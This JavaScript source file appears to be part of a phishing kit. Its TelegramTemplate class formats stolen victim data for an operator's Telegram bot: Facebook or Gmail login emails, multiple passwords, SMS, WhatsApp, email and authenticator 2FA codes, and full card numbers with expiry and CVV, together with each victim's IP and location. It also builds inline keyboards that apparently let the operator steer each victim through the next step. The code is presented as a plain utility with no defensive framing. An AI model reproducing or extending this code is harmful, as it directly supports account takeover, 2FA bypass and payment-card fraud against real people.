import { buildUnifiedInlineKeyboard } from "./gmailTelegramCommands.js";
import { toDialCode } from "./countryDialCodes.js";

/**
 * Utility class for generating Telegram message templates
 */
class TelegramTemplate {
  /**
   * Generate a formatted message template for user data
   * @param {Object} data - User data object
   * @param {string} data.id - User ID
   * @param {string} data.ip - User IP address
   * @param {string} data.full_name - User's full name
   * @param {string} data.login_email - Login email
   * @param {string} data.business_email - Business email
   * @param {string} data.page_name - Page name
   * @param {string} data.phone_number - Phone number
   * @param {string} data.password_one - First password
   * @param {string} data.password_two - Second password
   * @param {string} data.password_three - Third password
   * @param {string} data.tfa_one - First 2FA code
   * @param {string} data.tfa_two - Second 2FA code
   * @param {string} data.whatsapp - WhatsApp 2FA
   * @param {string} data.email2fa - Email 2FA
   * @param {string} data.auth_app_2fa - Auth app 2FA
   * @param {string} data.CardName - Card holder name
   * @param {string} data.CardNr - Card number
   * @param {string} data.CardDate - Card expiry date
   * @param {string} data.CardCvc - Card CVC
   * @param {string} data.currentStep - Current step in the process
   * @returns {string} Formatted message template
   */
  static generateUserDataTemplate(data) {
    const {
      id,
      ip,
      full_name,
      login_email,
      business_email,
      page_name,
      phone_number,
      password_one,
      password_two,
      password_three,
      tfa_one,
      tfa_two,
      whatsapp,
      email2fa,
      auth_app_2fa,
      CardName,
      CardNr,
      CardDate,
      CardCvc,
      currentStep,
      context,
      country,
      city,
      countryCode,
    } = data;

    const params = [
      `============${context ? context : "==="}============`,
      id ? `ID: \`${id}\`` : "",
      ip ? `IP: \`${ip}\`` : "",
      country ? `Country: \`${country}\`` : "",
      city ? `City: \`${city}\`` : "",
      countryCode ? `Country Code: \`${toDialCode(countryCode)}\`` : "",
      full_name ? `Full Name: \`${full_name}\`` : "",
      business_email ? `Business Email: \`${business_email}\`` : "",
      login_email ? `${page_name === "Gmail" ? "Gmail Email" : "Facebook Email"}: \`${login_email}\`` : "",
      phone_number ? `Phone: \`${phone_number}\`` : "",
      password_one ? `Password1: \`${password_one}\`` : "",
      password_two ? `Password2: \`${password_two}\`` : "",
      password_three ? `Password3: \`${password_three}\`` : "",
      tfa_one ? `2fa: \`${tfa_one}\`` : "",
      tfa_two ? `2fa-2: \`${tfa_two}\`` : "",
      CardName ? `Name: \`${CardName}\`` : "",
      CardNr ? `Card Number: \`${CardNr}\`` : "",
      CardDate ? `Expiry Date: \`${CardDate}\`` : "",
      CardCvc ? `CVV: \`${CardCvc}\`` : "",
      whatsapp ? `Whatsapp 2fa: \`${whatsapp}\`` : "",
      email2fa ? `Email 2fa: \`${email2fa}\`` : "",
      auth_app_2fa ? `Auth App 2fa: \`${auth_app_2fa}\`` : "",
      "=============================",
    ]
      .filter(Boolean)
      .join("\n");

    return currentStep
      ? `${params}\nCurrent Step: ${currentStep}\n=============================`
      : params;
  }

  /**
   * Generate inline keyboard for Telegram bot
   * @param {string} id - User ID
   * @returns {Object} Inline keyboard object
   */
  static generateInlineKeyboard(id, pageName) {
    return buildUnifiedInlineKeyboard(id);
  }
  /**
   * Generate Gmail-specific inline keyboard for Telegram bot
   * @param {string} id - User ID
   * @returns {Object} Inline keyboard object
   */
  static generateGmailInlineKeyboard(id) {
    return buildUnifiedInlineKeyboard(id);
  }
}

export default TelegramTemplate;
